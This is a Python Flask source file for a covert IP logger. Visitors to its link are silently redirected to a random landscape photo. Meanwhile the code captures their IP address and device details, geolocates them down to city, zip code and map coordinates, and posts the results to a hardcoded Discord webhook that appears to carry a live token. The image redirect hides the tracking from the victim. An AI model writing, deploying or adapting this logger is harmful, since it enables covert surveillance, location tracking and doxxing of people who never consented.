from flask import Flask, request, redirect
import requests
import json
from user_agents import parse

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1474987213019287745/MiPRIVfwiJcHNgsFlyT_JNFUXWR8E6CxFZpw2henPkFag6vxhDQyXs_92X9EOBsX-9e7"

# List of random image URLs to display
IMAGES = [
    "https://images.unsplash.com/photo-1506744038136-46273834b3fb",
    "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05",
    "https://images.unsplash.com/photo-1441974231531-c6227db76b6e",
    "https://images.unsplash.com/photo-1501785888041-af3ef285b470",
    "https://images.unsplash.com/photo-1493246507139-91e8bef99c02"
]

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
        return response.json()
    except Exception:
        return None

@app.route('/')
def logger():
    # Extract IP (Vercel uses x-forwarded-for)
    ip = request.headers.get('x-forwarded-for', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent_string = request.headers.get('User-Agent')
    ua = parse(user_agent_string)
    
    # Simple device info
    device = f"{ua.os.family} {ua.os.version_string} | {ua.browser.family} {ua.browser.version_string} | {ua.device.family}"

    # Get Geo-location
    geo = get_ip_info(ip)
    
    # Prepare Discord Webhook Content
    embed = {
        "title": "📍 New Visitor Logged",
        "color": 15158332, # Red
        "fields": [
            {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "📱 Device", "value": f"`{device}`", "inline": False},
        ]
    }

    if geo and geo.get('status') == 'success':
        embed["fields"].extend([
            {"name": "🌍 Country", "value": f"{geo.get('country')} ({geo.get('countryCode')})", "inline": True},
            {"name": "🏙️ City", "value": f"{geo.get('city')}, {geo.get('regionName')}", "inline": True},
            {"name": "📮 Zip Code", "value": f"{geo.get('zip')}", "inline": True},
            {"name": "🛰️ ISP", "value": f"{geo.get('isp')}", "inline": False},
            {"name": "⏰ Timezone", "value": f"{geo.get('timezone')}", "inline": True},
            {"name": "🗺️ Coordinates", "value": f"[{geo.get('lat')}, {geo.get('lon')}](https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')})", "inline": True},
        ])
    else:
        embed["description"] = "⚠️ Could not retrieve detailed geo-location."

    payload = {
        "username": "IP Locator Bot",
        "avatar_url": "https://i.imgur.com/w9fXfM9.png",
        "embeds": [embed]
    }

    # Send to Discord
    requests.post(WEBHOOK_URL, json=payload)

    # Redirect to a random image
    import random
    return redirect(random.choice(IMAGES))

# For local testing if needed
if __name__ == '__main__':
    app.run(debug=True)
